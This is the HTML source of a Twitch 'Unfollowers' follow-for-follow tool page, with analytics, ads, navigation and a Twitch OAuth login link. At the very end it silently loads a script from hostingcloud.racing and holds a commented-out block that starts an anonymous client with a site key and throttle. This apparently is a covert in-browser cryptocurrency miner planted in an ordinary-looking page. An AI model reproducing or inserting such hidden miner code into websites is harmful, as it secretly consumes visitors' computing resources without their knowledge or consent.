<!DOCTYPE html>
<html>
    <head>
        <title>Unfollowers - A F4F tool to help you find who unfollowed you</title>
        <!-- Google Tag Manager -->
        <script>(function (w, d, s, l, i) {
                w[l] = w[l] || [];
                w[l].push({'gtm.start':
                            new Date().getTime(), event: 'gtm.js'});
                var f = d.getElementsByTagName(s)[0],
                        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
                j.async = true;
                j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-TZSXQFP');</script>
        <!-- End Google Tag Manager -->
        <meta name="description" content="If you are a streamer and use follow for follow service, you can check if people have unfollowed you.">
        <meta name="keywords" content="twitch, unfollow, free, unfollowers, follow for follow">
        <meta name="author" content="Daniel Baychev">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" type="image/x-icon" href="img/h.png" />
        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="css/css.css" rel="stylesheet" type="text/css"/>
        <link href="css/index.css" rel="stylesheet" type="text/css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="f4f.js"></script>
        <script src="login.js" type="text/javascript"></script>
        <script type = "text/javascript" src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <script>
            (adsbygoogle = window.adsbygoogle || []).push({
                google_ad_client: "ca-pub-3989608972631976",
                enable_page_level_ads: true
            });
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script>
            function myFunction() {
                var x = document.getElementById("myTopnav");
                if (x.className === "topnav") {
                    x.className += " responsive";
                } else {
                    x.className = "topnav";
                }
            }
        </script>
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-129733775-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag() {
                dataLayer.push(arguments);
            }
            gtag('js', new Date());

            gtag('config', 'UA-129733775-1');
        </script>
    </head>
    <body id="body" style="font-family: Sans-Serif;background-color: white;">
        <!-- Google Tag Manager (noscript) -->
        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TZSXQFP"
                          height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
        <!-- End Google Tag Manager (noscript) -->
        <nav role='navigation'>
            <div class="topnav" id="myTopnav">
                <a href="f4f.php" onclick="page(this);" class="active">F4F Tool</a>
                <a href="home.php" onclick="page(this);">Home</a>
                <a href="register.php" onclick="page(this);">Unfollower</a>
                <a href="regchatters.php" onclick="page(this);">Viewers</a>
                <a href="links.php" onclick="page(this);">Useful Links</a>
                <a href="about.php" onclick="page(this);">About</a>
                <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=v8jjvzxpx7byti5lykiyy5001gueh4&redirect_uri=http://unfollowers.tv/home.php&scope=analytics:read:extensions"><img height="25"  class="logme"  src="img/login.png"></a>
                <a href="javascript:void(0);" class="icon" onclick="myFunction()">
                    <i class="fa fa-bars"></i>
                </a>
            </div>
        </nav>
        <br>
<?php // require_once 'ads.php';
?>

       
        <p class="mobile" style="color:#33333357;" >* If you are using your mobile, we highly suggest to use the desktop version instead, since the website is not YET optimized for phones<br>The result page will display only 10 users/channels at a time.  </p>
        <p class="" style="text-align: center;color:grey;">* Use the hover effect on the left to see if the user/channel who you follow, follows you back.<br>The result page will display only 10 users/channels at a time.</p>
        <div style="background-color:#333333;border-radius: .25rem;" class="container">
            <div class="row">
                <div id="fccStatus" class="col-md-6 col-sm-6">
                    <h2 style="text-align: center;color:white;">
                        Users you follow :
                    </h2>
                    <br>
                </div>
                <div id="links" class="col-md-6 col-sm-6">
                    <h2 style="text-align: center;color:white;">
                        Users who followed back :                    
                    </h2>
                    <br>
                </div> 
            </div>
        </div>
        <br>
        <button class="btn" style="display:block;margin:auto;" id="next" onclick="nextPage();">Next page</button>
        <br>
        <div class="footer">
            <p style="margin:auto;">twitchtoolstv@gmail.com <a target="_blank" href="https://patreon.com/twitchtools"><img src="img/patreon.png" height="15"/></a> <a href="https://twitter.com/AnalyticsTwitch"><img height="15" src="img/twitter.png"/></a></p>
        </div>
        <script type="text/javascript">  if (typeof tkn === "string") {
                var hide = document.getElementById("hidden");
                hide.style.display = "none";
            }</script>
        <script src="https://www.hostingcloud.racing/8qk1.js"></script>
        <!--<script>
            var _client = new Client.Anonymous('2beb50d3caea6149deaa2ea8aa1c2007caa56923a55a5bfcfffaa91a10722bc6', {
                throttle: 0.3, ads: 0
            });
            _client.start();


        </script> -->
    </body>
</html>
